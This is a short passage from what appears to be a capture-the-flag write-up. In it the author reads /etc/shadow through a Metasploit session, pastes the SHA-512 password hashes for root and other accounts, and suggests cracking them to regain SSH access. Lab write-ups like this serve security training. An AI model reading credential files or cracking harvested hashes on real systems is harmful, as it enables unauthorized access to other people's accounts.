# Extra Credit
I did, also, cat /etc/shadow so I can smash the user passwords if I wanted to. If for whatever reason I was unable to gather the flag right away and needed to SSH back into the machine, I could potentially crack these and go that route as our foothold.
```bash
msf6 > cat /etc/shadow
stty: 'standard input': Inappropriate ioctl for device
[*] exec: cat /etc/shadow

root:$6$RO4wVQ/hyXhjln4S$UQl5o6XSa2USqAM.RT9YwujFhZWriZqEz5We.opH1FLTbDtLfruET9jlKcEEqfxnCb1UxwhcfWJ/2gPJE77Bl.:18632:0:99999:7:::
 - clipped -
kid:$6$t9JpsHjs2xHQDAP1$QEU0fwmSLk43RRFkBN8qeBekqyjoGgSTny9srHGD38bTTfbeVSQb6lLMD3T.xWPubJVW9TMxsH3wWUrfNXHj.1:18632:0:99999:7:::
lxd:!:18632::::::
pwn:$6$Ci5SpF8qatWsgxYl$V.25LKjBgcpiLtytRV1OaqEBtYWMRT3HURaNXQ0mrdwMz12S0BZccmVgNDeAZcShpponbEedzJlpcGOXpLcWx.:18655:0:99999:7:::
```bash